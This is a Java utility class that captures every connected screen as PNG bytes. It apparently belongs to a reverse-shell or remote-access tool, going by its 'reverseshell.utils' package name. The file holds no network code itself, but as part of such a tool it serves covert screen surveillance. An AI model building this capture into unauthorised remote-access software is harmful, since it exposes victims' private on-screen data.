package obs1d1anc1ph3r.reverseshell.utils;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;

public class ScreenShot {

    private static final Robot robot;

    static {
        try {
            robot = new Robot();
        } catch (AWTException | HeadlessException ex) {
            Logger.getLogger(ScreenShot.class.getName()).log(Level.SEVERE, "Error initializing Robot: ", ex);
            throw new RuntimeException("Robot initialization failed", ex);
        }
    }

    public byte[] imageBytes() {
        try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();

            Rectangle allScreenBounds = new Rectangle();
            for (GraphicsDevice screen : screens) {
                Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
                allScreenBounds.width += screenBounds.width;
                allScreenBounds.height = Math.max(allScreenBounds.height, screenBounds.height);
            }

            BufferedImage capture = robot.createScreenCapture(allScreenBounds);

            try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream()) {
                ImageIO.write(capture, "png", byteArrayOutputStream);
                return byteArrayOutputStream.toByteArray();
            }

        } catch (IOException ex) {
            Logger.getLogger(ScreenShot.class.getName()).log(Level.SEVERE, "Error capturing screenshot: ", ex);
            return null;
        }
    }
}
